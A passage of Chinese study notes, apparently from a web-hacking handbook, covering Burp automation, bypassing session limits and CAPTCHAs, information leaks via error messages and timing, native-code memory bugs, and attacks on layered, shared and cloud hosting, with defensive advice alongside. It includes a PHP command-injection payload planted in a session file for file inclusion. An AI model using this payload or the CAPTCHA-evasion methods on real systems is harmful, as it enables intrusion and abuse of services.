注入攻击，因为在请求参数中放入一个单引号后，应用程序返回的响应不同，因此接下来可针对该潜在漏洞，进一步分析其利用的可能性； 当现某个潜在漏洞时，可将响应发送到 Repeater 工具，该工具用来针对某个潜在漏洞，修改参数的多种形式，多次重新提交请求，以探查应用程序的处理逻辑，以及避开过滤或者净化的办法； 实施自动化的限制应用程序很可能存在某种防御攻击者提交大量自动化请求的机制，常见的两类： 会话终止：当应用程序发现存在异常请求时，就终止当前会话；或者在某个关键功能中使用反 CSRF 令牌之类的临时参数，或引入多阶段验证，在接收当前请求前，需要先完成一系列的其他请求； CAPTCHA 控件：专门在注册用来防御机器人； 会话终止 针对应用程序终止会话的防御机制，Burp 通过引入下面一些组件来尽可能避开防御机制： cookie 库虽然浏览器会维护一个 cookie 库，Burp 也会自己维护一个，用于相关的组件，同时方便随时根据需要进行更新和修改； 请求宏将多个步骤集成为一个，这样可以在提交每一次的攻击荷载前，先通过宏让应用程序进入接受请求的状态，例如检查当前登录状态、若无效则执行登录获取新会话、获取令牌等工作； 可以使用浏览器来录制宏，并做录制好的每一个步骤配置额外的动作，例如提取有用的信息，用于后续的动作，包括： 是否将库中的 cookie 添加到请求中； 是否将响应中的 cookie 添加到库中； 请求参数是否使用预设值，还是使用在响应中获取的值（当存在反 CSRF 令牌时，该方法很有用）； 会话处理规则原理很简单，即通过对特定请求进行预处理，以避开应用程序的会话限制；由于应用程序可能在不同的功能中使用不同的限制规则，因此需要有针对性的配置规则；当 Burp 发起某个请求时，如果满足预设的匹配条件，就会触发预处理； 匹配规则有：发起请求的 Burp 工具、请求的 URL、请求中的参数名称； 预处理操作包括：添加 cookie ，设置特定的 cookie 或参数值、检查当前会话是否有效并根据结果执行不同的操作、运行宏、提示会话恢复； 配置规则时，有时候避免会出错，导致 Burp 并不按预期的方式进行工作，因此Burp 还提供一项会话处理追踪的功能，用来监控和调试会话处理规则，以便确保配置是否按预期的方式进行； CAPTCHA 控件随着计算机识别图片内容能力的不断强化，事实上现在人类与计算机的水平已经相当，导致 CAPTCHA 已经失去了它在一开始预算起到的作用； 攻击 CAPTCHA 控件搞笑的是，有很多应用程序在发送 CAPTCHA 拼图时，还会悄悄的把答案也发过来，一般有以下几种方式： 拼图的图像通过 URL 加载，拼图的答案就在 URL 的参数或者图片名称中； 拼图的答案放在某个隐藏表单的字段中； 拼图答案出现在 HTML 注释或其他位置（用于调试）； 正常情况下，拼图应该只使用一次后就废弃，但有些应用程序并不是这么做的，而是反复使用；因此，攻击者可以先手工解决某张拼图的答案，然后在请求在反复提交拼图和相应的答案； 自动破解 CAPTCHA 拼图目前绝大多数拼图算法都可以被计算机轻松破解，破解的过程如下： 删除图像中的噪声； 把图片分割单个字母； 识别每个部分中的字母； 目前网上已经有一些非常成熟的库，可以用来处理 CAPTCHA 拼图；针对不同的拼图类型，可以使用不同的库进行处理；事实上，拼图识别效率并不需要 100%，即使只能识别 10%，那么也能够让 10% 的请求变成有效的，而提出大量的请求对计算机来说是最简单不过的任务了； 人类破解者 有一些第三方的付费服务可以调用，让其破解拼图，每破解 1000 个拼图的费用不到 1 美元； 另外攻击者还可以自建一个外表看起来正常的善意的网站，然后实际传输的是目标网站的拼图，并诱使其用户对拼图进行破解；攻击者还经常在其网站上使用竞赛奖励或者免费访问色情内容的方式来吸引用户帮助其破解； 小结 思维方式的不同是真正的 Web 应用程序黑客和普通爱好者之间的最大区别，因为任何工具都替代不了人类的智慧； 15. 利用信息泄露利用错误消息错误消息脚本对于解释型语言来说，其代码实际上是运行在解释器中的，为了方便调试，当发生错误时，大多数解释器都会输出详细的错误信息，以及函数的调用栈等。这意味着如果 Web 应用程序是使用脚本语言来编写的话，如果控制不当，攻击者就有可能获取这些信息，从而为攻击提供便利； 类型不匹配错误：缩小了攻击参数的范围 行号可用来判断每次触发的是否是同一个位置的错误，以及应用程序在处理多个参数时的顺序； 栈追踪当某种由高级语言编写的程序，是运行在某个托管环境中的时候（即解释器，如 Java、C#、Python、JS 等），如果出现了无法处理的错误，那么解释器将会抛出错误，此时浏览器往往会显示完整的栈追踪；栈追踪显示的信息将给攻击带来极大的帮助，主要包括： 可通过栈信息详细了解错误发生的原因，从而可以调整输入，避开错误； 如果程序调用第三方的库，则也会同时显示在栈追踪中，此时可以查阅这些第三方库的源代码，了解它们的行为和逻辑，并下载它们在本地进行测试，探查应用程序处理异常输入的逻辑，发现潜在的漏洞； 调用栈中很可能还会显示一些组件调用的情况，通过组件的命名，可以推测应用程序的内部结构和功能； 栈追踪中显示的行号可用来探查应用程序的逻辑； 栈追踪中通常还包括运行环境的信息，例如框架的名称和版本，从而可以根据该信息，搜索查找其已知的漏洞、异常行为和常见的配置错误等； 详尽的调试信息在开发阶段，开发者通常会让程序输出大量的调试，从而有助于开发者对应用程序进行调试，这些调试信息通常会揭露应用程序当行的运行状态，常见信息包括： 保存在会话中的变量值； 数据库等后端组件的主机名称和密码等敏感信息； 服务器中的文件和目录名称； 保存在会话令牌中的令牌； 数据传输的加密密钥； CPU 寄存器的值、栈内容、加载的 DLL 列表和路径等； 服务器与数据库消息除了应用程序本身，其他组件如数据库、邮件服务器、SOAP 服务器等，在遇到无法处理的错误时，也会抛出详细的错误信息；有时候这些信息会被应用程序放在响应主体中返回到前端，此时攻击者可以利用这些信息，探查到更多的漏洞，常见的利用形式包括： 扩大攻击范围：例如数据库抛出查询错误，从而暴露了 SQL 查找代码的逻辑，攻击者可加以利用，优化 SQL 注入行为； 实施跨站点脚本攻击：有些框架返回错误消息的响应时，没有对错误消息进行 HTML 编码，因此如果错误消息中的某个部分是可以由用户控制的输入，那么此时攻击者就有机会针对性的设计输入，干扰浏览器的解析，实现跨站点脚本注入攻击； 获取解密提示：应用程序可能使用某个解密值对某个加密文件进行解密，但该文档不存在时，该解密值有可能会意外显示在错误消息中； 获取重要的文件路径：错误消息可能会暴露应用程序加载某个服务器文件路径中的文件，此时攻击者可以找机会上传文件，覆盖该路径中的文件； 渗透测试步骤 当通过设计攻击字符串发送大量攻击请求时，应始终监控应用程序的响应，在确定是否包含有用的错误信息；发挥想象力，强制应用程序返回错误响应，例如对未处于就绪状态的资源，发起请求； 应用程序返回的响应内容不一定会显示在浏览器中，应留意所有可能出现错误信息的关键字，例如：error, exception, illegal, invalid, fail, stack, access, directory, file, not found, varchar, ODBC, SQL, SELECT 等； 另外需要留意一下出现在响应中的关键字，是否原本就已经在发送的请求参数中了，如果是的话，则不一定是错误响应，应当排除； 可以使用 Grep 函数来搜索匹配的关键字；如果发现，应当手动检查相应的响应，分析其中是否包含有用的信息； 有些浏览器会隐藏原始的错误消息，然后用一个浏览器自己的定制页面来替代，因此需要提前关闭浏览器的该项功能； 借助搜索引擎不同的 Web 应用程序使用的库不尽相同，经常五花八门，当出现一些未曾见过的错误信息时，只需到网上进行搜索，即可以进一步了解到该错误发生的原因和逻辑； 开发者有时并不一定直接引用某个库，而只是复制部分代码，合并到其源代码中； 渗透测试步骤 使用标准搜索引擎搜索任何不常见的错误消息文本，以及学会使用各种高级搜索特性，缩小搜索的范围，例如：\"unable to retrieve\" filetype:php 同一条错误消息，其他应用程序生成的内容可能更加详细，有助于更好的了解错误发生的条件； 使用 Google 代码搜索功能，查找生成特定错误消息的开源代码；学会使用高级搜索特性指定代码语言和一些已知的细节，从而缩小搜索范围，提高搜索效率，例如 \"unable to retrieve lang:php package:mail\" 如果从栈追踪中得知了所使用的第三方库或组件的名称，则可以直接搜索这些名称； 制造详尽的错误消息攻击者通过系统性的制造错误条件，触发错误消息，很可能可以从错误消息中收获很多有价值的敏感信息。例如让应用程序对某个数据执行某种无效的操作（如字符串转整数），就会自动触发错误条件，导致应用程序报错；如果报错的信息中，会暴露该无效操作要处理的数据，则攻击者就得到了该数据，而且正常情况下，攻击者是不知道该数据的值的； 例如可以在 SQL 注入攻击中，在 SQL 语句中检索某个数据并对其进行错误的类型转换，从而触发 ODBC 的报错，然后从报错消息中得到检索的数据 如果应用程序在报错时，会生成包含错误描述的栈追踪，则可以利用该特性，将想要获取的有用信息，合并到错误描述中； 有些数据库允许开发者创建自定义函数，假设应用程序存在 SQL 注入漏洞，那么攻击者就可以利用该漏洞，注入任意的自定义函数，执行任意的动作。假设应用程序还会返回错误信息给浏览器，那么攻击者就可以故意让函数生成异常，并将获取的信息，放在错误消息中，让应用程序返回。 收集公布的信息由于功能设计需要，应用程序会在界面上有意无意的显示出来一些对攻击者有用的敏感信息，例如： 有效用户名、ID、文档列表等； 用户个人资料、用户角色、权限、最后登录日期、账户状态等； 用户当前使用的密码（一般不会直接显示在页面上，但却出现在响应的源代码中）； 部分日志文件中的信息，如用户名、URL、执行的动作、会话令牌、数据库查询等； HTML 源代码中的注释内容，如链接、表单字段等； 渗透测试步骤： 核对应用程序的解析结果，看哪些服务端功能，或者哪部分客户端数据，可用于获取有用的信息； 找出服务端会返回敏感信息的所有位置（注意：这些敏感信息可能只出现在响应内容中，但没有在界面上显示）； 检查应用程序是否存在访问控制或会话控制的漏洞，如果有，则可以用来获取其他用户的敏感数据； 使用推论有时候，应用程序可能并不会泄露数据，但由于其功能设计缺陷，导致攻击者可以通过逆向推理，获知有用的信息，例如： 如果用户名已经存在，注册功能会给出提示，因此攻击者可以利用这个提示对用户进行枚举； 搜索引擎将所有内容编入索引，在搜索功能中未做权限检查或过滤； 利用 SQL 注入漏洞，一个查询一个字符，虽然查询的内容并不会返回，但是可以将查询结果放入表达式进行计算，若条件成立，则设置其会触发错误，通过是否得到错误响应，来反向推断查询结果是否符合表达式的计算预期； 另外，攻击者还可以通过响应的时间延迟，来推断某些数据是否有效； 许多大型系统由于其数据库的条目较为庞大，单次查询需要花费较多的时间，为了提高性能，一般会使用缓存机制，即将频繁使用放在缓存中；因此，通过访问时间的差别，攻击者可以推断哪些数据最近有被访问； 有些请求需要验证用户的身份信息，因为应用程序需要查询数据库，进行权限的逻辑判断，攻击者可以利用处理时间的差异，枚举出有效的用户名； 当用户在请求中提交一个无效的参数时，有可能造成应用程序的处理超时；根据是否超时，攻击者可以枚举有效的参数值，了解参数值的范围，例如该参数值是服务端内部网络的地址，那么攻击者就可以枚举出有效的主机地址（Burp 工具内置一个响应计时器，可以用来判断这种情况是否出现）； 渗透测试步骤： 总体来说，应用程序在处理大多数请求时，其响应时间的差异非常小，如果有，也很难排除是否是由于随机的网络状况引起的，需要定量统计才能排除；只有少数功能涉及 IO 或 CPU 的密集计算，才会导致存在差异； 为测试某个功能在处理有效和无效数据时，是否存在时间差异，可以准备两个待发送的数据列表，一个全是有效的数据，一个全是无效的，然后不断发送请求，一次只发一个，最后比对二者在响应时间上是否存在统计差异（Burp 有内置自动统计的工具）； 防止信息泄露使用常规错误消息应避免向浏览器返回任何服务端的错误消息或调试消息，而是只返回一种统一的消息格式，同时将服务端的错误或调试消息单独记录在日志文件中；如果需要用户汇报错误情况，则可以给浏览器返回一个日志索引号，当用户反馈错误时，只需要提交该索引号即可； 多数 Web 应用程序框架或者服务器软件都支持拦截错误消息的配置，配置后，错误消息将不会返回给浏览器，而是返回一个统一定制的错误页面； 保护敏感信息应用程序应禁止向浏览器发送任何有关用户的敏感信息，如用户名、用户个人资料、日志记录等；如果用户需要查看这些信息，则应对查看功能加上权限检查，同时，只返回信息的截短后的形式，而不是完全披露现有的数据； 尽量减少客户端信息泄露只要有可能，应该删除或者修改任何有关服务器软件、软件框架名称和版本等相关信息的标记，避免泄露特定的版本信息；同时，应该删除生产环境中的代码的所有注释； 此外，如果在前端使用一些第三方组件，如 Java Applet 或者 ActiveX 控件，则也应该避免在其中存放任何的敏感信息，因为攻击者可以逆向它们； 16. 攻击本地编译型应用程序现在多数 Web 应用程序都不再是本地编译型程序了，它们大多数都运行在某个解释环境中，例如 Java，C#，Python，NodeJS 等；尽管如此，它们仍然有可能调用某些编译型语言写的库，因此，除非有充分的信息说明该应用程序未调用任何本地编译的代码，否则应该对其进行漏洞探查； 本地编译型程序的代码是由 CPU 直接运行的，没有解释环境，因此，它们一般受到缓冲区溢出、格式化字符串、整数漏洞等问题的困扰，当对这些漏洞进行探查时，很容易造成整个应用程序的崩溃（如果是对现有处于生产状态的应用程序进行这方面漏洞的探查工作，则需要知悉这个风险，通常情况下，最好是对测试环境中的程序进行探查比较好）； 本地编译型软件的漏洞是另外一个巨大的课题，如需要进一步研究，作者推荐以下几本参考书： 缓冲区溢出漏洞由于虚拟内存机制，应用程序的指令实际上能够控制的是虚拟内存，物理内存理论上应该不存在缓冲区溢出的问题。溢出问题主要出现在写入的数据，超过了所分配的空间，因此，多出来的部分，覆盖了其他旧数据。当应用程序尝试读取旧数据时，实际上已经被替换为溢出的新数据，此时如果应用程序没有察觉，就有可能信任这些数据并直接使用或者执行。 栈溢出开发者常常犯的一个错误是将某个大小可变的数据，写入某个大小固定的内存中；在开发的时候，开发者会默认正常的输入有最大长度，但如果没有校验和过滤，实际上输入的长度将是任意的； 默认情况下，如果没有特别声明，函数内部的局部变量使用栈来存储临时的数据，因此，攻击者可以通过控制实参的长度，让其超过开发者在函数中分配的变量长度，造成栈溢出； 栈空间是由编译管理和分配的，因此其中保存着函数调用后的返回地址；当发生栈溢出后，原本的返回地址将被改写；但CPU 并不知晓，但其尝试读取返回地址时，实际上很可能会取到攻击写入的其他返回地址，跳转到攻击者注入的代码，执行攻击者预设的指令； 堆溢出堆溢出和栈溢出并没有本质上的区别，唯一的差别是发生的地点在堆上； 堆是由开发者进行管理和分配的，因此里面通常保存着纯数据类型的内容，不像栈中放着返回地址；当发生堆溢出时，会覆盖其他块的头部数据，导致其他块不可用。由于堆通常使用双向链接结构来实现，因此一旦某个块被破坏了，后续的块可能全部不可用了； 因此，如果要利用堆溢出的漏洞，攻击者就必须特别小心，需要精心设计其溢出数据，让其在不破坏原本下一个块的头部数据的基础上，改写其中的指向下一个链表指针。该值被修改后，并不会马上发生什么后果；但是当这个块被回收时，由于堆控制器需要更新链表，因此它需要从块的头部数据中，读取下一个块的址，但实际上，该地址的值已经被攻击者通过溢出修改了。攻击者可以让这个地址的值，指向任意位置，执行其注入的指令；一般攻击者会让改写后的指针值，指向下一个被调用的函数地址，这样该函数就会在接下来执行；或者指向异常处理函数的地址，这样当下次发生异常时，函数会被执行； 由于开发者的编程错误不可避免，因此目前很多编译器和操作系统已经设计出了各种机制，来尽量缓冲区溢出的问题；整体来说，缓冲区溢出漏洞的利用比以往要难得多； 一位偏移漏洞 理论上，为了避免出现缓冲区溢出，开发者在复制参数内容，写入分配的缓冲区时，应该控制写入的长度，示例如下： 在代码中，开发者已经将长度控制在 32 位了，但是，由于字符串最后还需要一个终止符，所以实际字符串的最大长度只能是 31 位；此时，如果攻击者传入 32 位的字符串参数，将导致终止符溢出，覆盖邻近内存上的数据； 通常字符串的终止符只有一个字节的长度，而邻近的内存，正常是另外一个栈桢的头部，该头部通常包含着返回地址；当溢出发生时，原本的返回地址将有一个低位字节被改写为零（地址通常不止一个字符，例如 32 位的字符有4个字节）；被改写后的返回地址的值变小了，因此很可能会重新指向原本的 _username 缓冲区中，从而指向攻击者控制的数据；如果攻击者精心设计其输入的数据，那么便有可能接管接下来要执行的指令； 另外还有一种漏洞，是开发者忘了给缓冲区中的字符串添加终止符， 这样会导致编译器无法在预期的位置结束字符串，而是会一直往下读取，直到遇到值为零的字符为止； 这种漏洞会造成应用程序一些奇怪的异常行为，它使用变量值变长了，如果该变量值有可能被返回到浏览器的话，那么攻击者就可以利用这个漏洞来获取内存中的其他数据，造成信息泄露的风险； 查找缓冲区溢出漏洞大多数情况下，向应用程序发送一个超过其预期长度的字符串，即可以探查出是否存在缓冲区溢出漏洞（少数漏洞需要发送特定的长度，或者特定范围内的长度）； 渗透测试步骤： 由于开发者通常喜欢使用 2 的整数倍做为字符串缓冲区长度，例如 32，128，512，4096 等；因此可向每个目标数据，提交一稍大于缓冲区大小的长字符串，例如 1100， 4200， 33000 等； 一次只攻击一个目标数据； 轮流发起攻击，尽量覆盖所有的目标数据； 可以使用第三方工具如 Burp 设置好规则，然后自动生成各种大小的有效攻击数据； 监控应用程序的反应，看看有没有发生什么异常现象；常见的异常包括： HTTP 500 状态码或者出现错误消息（跟不符合格式的输入造成的异常不同）； 比常规内容更详细的错误消息（很可能意味着某个组件发生了错误）； TCP 没有响应或者突然关闭； 整个 Web 应用程序停止响应； 当发生堆溢出时，一般并不会马上导致程序崩溃，但是很有可能会在后续某个时间点造成崩溃；因此，要确定哪些字符串造成崩溃，还需要一定的观察时间； 一位偏移漏洞一般不会造成崩溃，但一般会导致出现异常行为，此时应用程序可能会返回异常的数据内容； 通常情况下，应用程序会对输入的参数长度进行检查，并告知长度不符合要求，此时可以在其允许的范围内，尽可能的大；另外应用程序的检查机制可能还会限制参数的字符范围，因此，在探查漏洞前，攻击者应该先了解清楚参数规则，然后确保每个参数都符合规则的情况下，长度尽量长（通常可以使用一个已经验证有效的请求中的参数的字符串，然后加大其长度即可）； 有时候尽管发现了缓冲区溢出漏洞，但是要对其加以利用，仍然要面临很多挑战待解决 整数漏洞计算器以有限的位数，来模拟无限的计算，因此在某些特定的情况下，这种计算存在溢出的风险； 整数溢出当某个整数的计算结果超过了处理器可处理的最大值或者最小值时，就会发生溢出，这时计算结果会从最大值进入一个极小值，或者反过来，从最小值进入一个极大值； 上面这段代码计算了参数的长度，并增加 1 个字节，用来存储结束符；但由于长度的类型是 short，每种类型的整数，都有一个能够表示的最大值，对于 short 来说是 65535，因此，当长度计算结果超过了 65535 时，计算并存储结果时，就会发生溢出；攻击者可以利用这个漏洞，让参数长度为 65535，添加 1 后，溢出为 0；malloc 分配了一个长度为 0 的缓冲区，当向缓冲区写入数据时，很可能会覆盖邻近的缓冲区； 符号错误在 C 和 C++ 中，有一个讨厌的地方，即整数存在有符号和无符号两种类型，有符号指有正负符号，它需要占用一个位来存储符号；无符号则可以节省一个位，因此可表示的正整数范围更大一些。但是这也引入了一些安全隐患，即开发者在编写代码时，有时候不小心会将两种不同符号类型的变量放在一起计算，这些导致隐式的符号转换，编译器的处理方式是统一转换成无符号类型，这种转换并没有实际性的改变内存中的数据，而只是在逻辑层面，对内存中的数据换类型进行解读，因此原本有符号值，如果按无符号进行解读，有可能从负数变成一个很大的正数； 攻击者可以利用这个特点，传入一个负数，之后被 strncpy 隐式转换为很大的正数，导致处理器向原本很小的缓冲区尝试写入一个很大长度的字符串，从而发生溢出； 查找整数漏洞如果客户端提交的请求中包含整数值，就意味着有可能存在整数溢出的漏洞，常见情况如下： 客户端在请求参数、cookie、消息主体中，提交以十进制表示的整数值，此时应特别留意那些表示某个字符串长度的整数值； 有时候表示长度的整数值来源于某个二进制对象，因此并不以十进制表示，而是以十六进制表示，或者使用 Base64 编码，以便于进行 HTTP 传输； 渗透测试步骤： 当发现存在整数参数值，就可以尝试轮流发送不同的值，这些值分别是有符号和有符号类型的边界值； 如果参数以十六进制表示，则将上一步的边界值转换为相应的大端法或小端法的版本，如果十六进制值以 ASCII 格式提交，则应转换成相应的编码字符，确保可以被服务端正确解析 监控提交请求后，应用程序是否出现异常行为 格式化字符串漏洞 某些函数接受格式说明符（例如 C 语言中的 printf），有时候这些函数存在被滥用的漏洞。通常这类型的函数接受的变量数量是不定的，并且支持多种类型的参数；其中一个非常危险的格式说明符是 %n，它跟普通的格式说明符的意思很不一样，它表示接受一个指针作为参数，之后会将该说明符之前函数输出的字节数量写入到指针指向的位置； 这意味着如果攻击者能够控制全部或部分传入的参数，那么就可以修改指针值，让函数调用成功后，将结果写入到其指定的位置，覆盖原来的值，从而导致后续处理器读取的内容发生变化，并跳转到攻击者指定的位置，执行任意的代码； 查找格式化字符串漏洞探查格式化字符串漏洞的一个基本办法是在提交的请求参数中，包含大量的格式符，看应用程序如何处理它们；通常来说，如果应用程度存在这方面的漏洞，很有可能导致应用程序崩溃； 渗透测试步骤： 轮流向每个目标参数提交包含大量格式化符 %n 和 %s 的字符串； Windows FormatMessage 函数处理 prinft 函数中的说明符的方式略有不同，因此提交的参数应改写如下： 另外需要将 % 符号使用 URL 编码编成 %25，以便服务端能够正确解析 监控应用程序是否出现异常反应； 小结整体来说，即使应用程序存在上述的各种漏洞，因此程序是部署在服务端，攻击者无法像安装在本地端一样对其进行反复的测试探查，因此利用上述漏洞的难度较大。一般攻击比较有可能利用一位偏移的漏洞； 17. 攻击应用程序架构为了提高应用程序的可移植性和健壮性，通常都会对应用程序的各项功能进行模块化，并在模块之间约定好交互方式，这样可以极大的降低代码的耦合性； 分层架构最常见的三层架构分别如下： 以下是 Java 应用的典型分层 攻击分层架构利用层之间的信任关系假设应用程序中有一层专门负责访问权限检查，另外一层负责数据库查询，通常来说，数据库查询层会默认假设从权限检查层发过来的请求都是已经通过审查的，是有效的，因此会直接执行该层发过来的请求。但是这种假设存在漏洞，即如果攻击者攻陷了权限检查层（例如利用 SQL 注入漏洞），并发出任意请求给数据库查询层，则可以查询任意的数据，而不管是否使用管理员的身份进行查询； 分层架构存在另外一个问题，即层与层之间的信息可能存在隔离，利用数据库查询日志显示攻击者注入的每一条查询；但是日志中可能并没有存储是哪一名用户发起的攻击，需要与业务日志进行交互比对和排查，才有可能定位； 破坏其他层如果几个层都在相同的计算机上运行，则攻陷某一层后，攻击者就可以直接破坏其他层实施的安全保护，示例如下： 访问解密算法通常情况下，用户的密码不应该在服务端明文保存，而是会进行散列处理，单向加密，确保即使数据库泄露，攻击者也无法提取到密码；但是有些敏感数据只能使用对称加密，因为后续还需要使用它们的明文，例如信用卡号、安全问题等；此时，如果数据库中除了存储加密后的数据，还直接存储密钥的话，那么攻击者一旦攻陷数据层（例如利用 SQL 注入漏洞），则可以直接查询到密钥，从而实现对数据的解密； 利用文件读取提取 MySQL 数据假设应用程序存在路径遍历漏洞，那么攻击者可以利用这个漏洞，读取服务器上的数据库文件，绕开数据库和应用程序设置的权限控制机制； 使用本地文件包含命令多数应用程序都会读取和访问一些本地文件，如果存在漏洞，意味着攻击者可以漏洞读取服务器上的任意文件内容，造成敏感信息泄露；如果应用程序存在文件写入漏洞的话，则攻击者可以利用该漏洞，向任意文件中写入其指定的内容（例如通过 URL 下载包含恶意命令的远程脚本，注入日志文件），并设置或等待条件触发其执行（例如包含并读取日志文件，触发提前注入的恶意命令的执行）； 示例：PHP 会将会话内容存在在某个以会话 id 命名的文件中 内容如下： 因此攻击者可以通过设置自己的昵称，实现在会话文件中注入恶意命令的目的；例如将昵称设置为: 1&lt;?php passthru(id);?&gt; 然后再利用应用程序已存在的文件包含漏洞，通过将参数设置为会话文件的路径，实现对该文件的调用 渗透测试步骤： 对于已知的应用程序漏洞，充分发挥想象力，思考如果利用漏洞和应用程序分层架构间的信任关系，扩大漏洞的影响范围；很多针对 Web 应用程序的成功攻击，都是从利用某个影响有限的漏洞出发，再利用信任关系，破坏应用程序的其余部分，最终实现严重的攻击； 如果能够在应用程序的某个组件中执行任意命令，并能够与其他主机建立网络连接，则应考虑向操作系统和网络层面中的基础架构发动直接攻击，扩大攻击范围； 保障分层架构的安全尽量减少信任关系每一层尽量实施自己的权限控制，防止未授权的操作，同时不信任其他组件；示例如下： 服务器层对特殊的资源和 URL 路径实施基于角色的访问控制； 数据库层为不同的用户提供不同的账户，根据角色设置不同的权限范围；这样可以减少 SQL 注入漏洞的影响范围； 应用程序组件只使用最低权限的操作系统账户执行，以降低命令注入和文件遍历漏洞的影响范围； 隔离不同组件如有可能，尽量将每个层隔离开来，避免其无意间彼此交互 一个层不得读取和写入其他层使用的文件；而是使用其他层提供的访问渠道进行数据访问； 对不同组件之间的网络访问进行过滤，仅允许需要实现功能的最少服务。例如数据库服务器仅开放数据库查询端口，其他端口不开放；避免攻击者利用内部网络对数据库的操作系统层进行攻击； 有了 Docker 容器技术后，貌似以上目标更好实现了一些； 局部深层防御对构成整个应用程序的各个单独组件内部，进行加强防御； 对每台主机的各个层面进行安全强化，打上漏洞补丁，以减少攻击者利用漏洞进行扩散的可能性，让攻击的影响范围仅局限于单台机器； 对保存在应用程序层的数据进行加密，例如用户使用的密码、用户的敏感信息（如信用卡号等）； 共享主机与云服务供应商很多中小型企业会将自己的应用程序托管在云服务供应商的共享主机上面，此时需要注意以下风险： 云服务商的某个用户可能是攻击者，通过攻击云主机，实现对共享主机中其他组织的应用程序的攻击； 云服务商的某个用户可能在共享主机上部署了某个易受攻击的应用程序，导致共享主机被攻陷； 虚拟主机多个 Web 应用程序可能部署在同一台虚拟主机上，然后通过域名进行区分，当请求到达虚拟主机后，Nginx 或 Apache 服务器程序根据请求中的 Host 消息头区分请求的是哪一个应用程序，然后根据预先的配置，将请求转发给虚拟主机相应的应用程序； 共享的应用程序服务某个应用程序背后，可能是由分层的多个供应商的不同组成集成而来的；例如某个被大量中小企业共同需求的功能；举个栗子，在信用卡支付行业，市面上可能会存在三个层级的软件供应商： 零售商：向中小企业销售软件，并根据企业的需求定制外层的功能和界面； 信用卡公司：根据零售商的需求，开发核心功能； ASP 公司：根据多家信用卡公司的共同需求，开发核心应用程序，提供主机和部署，进行更新和支持； 攻击共享环境针对访问机制的攻击为了支持客户的个性化需求，ASP 一般通过上传（例如 FTP 或 SCP）或修改配置文件的功能来满足客户的定制需求，通常还会开放数据库端口，供客户查询保存的数据； 由于 ASP 供应商不可避免需要提供某种远程访问机制，因此存在一定的风险： 有些远程访问机制如 FTP 未加密，使得攻击者有机会在中间进行拦截，获取用户的密码； 部分远程访问软件本身存在漏洞或者配置缺陷，攻击者利用漏洞可绕过访问控制机制，访问或破坏客户的应用程序和数据； 远程访问的隔离机制可能做得不好，例如客户之间的数据没有完全隔离，存在相互访问的可能性；或者原本只需要提供文件访问的场景，却提供了 shell，允许客户输入各种命令； 数据库的隔离可能不完善； 数据库的连接可能使用非加密的方式访问； 有时 ASP 为客户提供单独的访问程序，来实现对核心程序的访问；这些单独的访问程序本身可能也存在漏洞，攻击者一旦攻陷，就可以对所有客户的应用程序发起攻击； 应用程序间的攻击在共享主机环境中，通常会允许用户向服务器合法上传可执行的脚本，导致存在应用程序间攻击的漏洞 预留后门攻击者伪装成某个应用程序的客户（即恶意客户），然后通过合法机制，上传恶意脚本，执行对服务器或其他用户应用程序的攻击； 有些共享应用程序甚至允许客户编写部分自己的代码，这也为恶意客户提供了引入恶意代码的机会； 应用程序本身漏洞如果应用程序本身存在漏洞，则攻击者可以利用该漏洞实现攻击： 利用 SQL 注入漏洞，对数据库进行查询，如果没有隔离机制，则攻击者可以读取并修改所有应用程序的数据； 利用路径遍历漏洞，读取和写入任意文件； 利用命令注入漏洞，控制服务器和其他应用程序； 应用程序组件漏洞由于共享应用程序允许客户做一定程度的定制，这意味着客户的定制代码可能会引入一些漏洞，攻击者可以利用这些漏洞进行攻击； 通常来说，共享应用程序存在多个组件，并且它们之间需要交互，常见漏洞如下： 不同客户的应用程序生成的数据通常会放在某个共享的文件目录下，然后 ASP 管理员有权限进行查看；这意味着为 XSS 攻击提供了方便之门，以自己的数据中注入脚本，当 ASP 管理员查看时，触发脚本的执行，获取管理权限或者管理功能； ASP 通常使用一个共享数据库保存所有的客户数据，因此一般使用某个共享组件，执行数据库的存储和查询过程，因此组件之间存在信任关系漏洞，恶意客户可以利用该信任关系获取其他用户的数据； 渗透测试步骤： 罗列共享应用程序为客户提供的访问机制 访问机制是否使用安全协议，及安全的基础架构？ 客户能否访问其原本不能访问的文件、数据或其他任意资源？ 访问机制是否为客户提供 shell，接受客户的任意指令？ 是否为客户提供某种定制或配置共享环境的功能？该功能是否可以成为攻击目标？ 如果应用程序支持命令、SQL 指令或任意文件，则值得仔细研究，寻找扩大攻击范围的可能性； 查找应用程序是否使用多个组件，如日志、管理、数据库等，检查这些组件是否存在漏洞； 检查应用程序所使用的数据库，使用开源工具如 NGSSquirrel 进行扫描，检查是否存在某些可利用的漏洞和缺陷；如有的话，再利用该漏洞扩大攻击范围； 攻击云越来越多的企业选择托管服务，这也意味着风险转移并聚集在了云服务商的身上，有部分安全问题已经是企业用户本身无法控制的；如果云服务商的托管服务出现漏洞，受影响的范围不再是某个应用程序或者某家企业，而是运行在托管环境中的成千上万的企业。 系统拷贝许多应用程序会依赖操作系统来生成随机数字，云服务商通常使用某个公共的镜像来安装操作系统，因此如果攻击者获得镜像的拷贝，则可以获得用于生成随机数字的源，从而能够预测随机数字生成器的状态和生成的值； 自助访问云服务商通常会提供某个管理云资源的自助页面，用户通过网页登录自助管理页面；如果登录过程存在访问控制漏洞，则攻击者有机会控制用户的云资源； 永久访问令牌用户需要管理云资源，为了避免频繁输入密码，用户一般会在本地保存某个令牌，用于登录验证；如果攻击者能够获取该令牌，则就能访问用户的云资源； Web 存储扩展云服务端提供的云存储功能是一个卖点，但它也意味着用户需要能够通过网页访问其存储的数据，因此云服务商在展示数据时，需要让数据支持某种浏览器扩展，而这些扩展可能存在漏洞； 保障共享环境的安全共享环境由于天然存在卧底和猪队友两种情形，因此需要特别留意访问控制、访问隔离和信任关系等问题； 保障客户访问的安全 访问机制需要使用严格的身份确认机制（目测阿里云和腾讯云都使用了双层验证机制，即增加了预留手机号的短信验证）； 仅给用户分配使用某个功能的最低权限；如果仅限于访问其私有目录；如果共享数据库，则确保其账户无法访问其他用户的数据； 如果使用某个定制的应用程序提供访问，则除了满足最严格的安全要求外，还需要对其进行测试； 隔离客户功能由于存在恶意客户的可能性，因此需要隔离每个客户使用的功能，确保单个客户无法攻击其他客户，常见措施如下： 为每个客户单独建立一个操作系统账号，并且该账号仅允许读取和写入为该客户分配的目录； 仅允许使用最低权限的少数操作系统命令； 为每个客户分配单独的数据库实例，仅向客户分配最低权限的账号，只允许访问私有的数据； PHP 6 之前的版本使用安全模式来降低脚本权限，但是模式有漏洞，如果能够运行 php 命令，则可以尝试通过 phpinfo 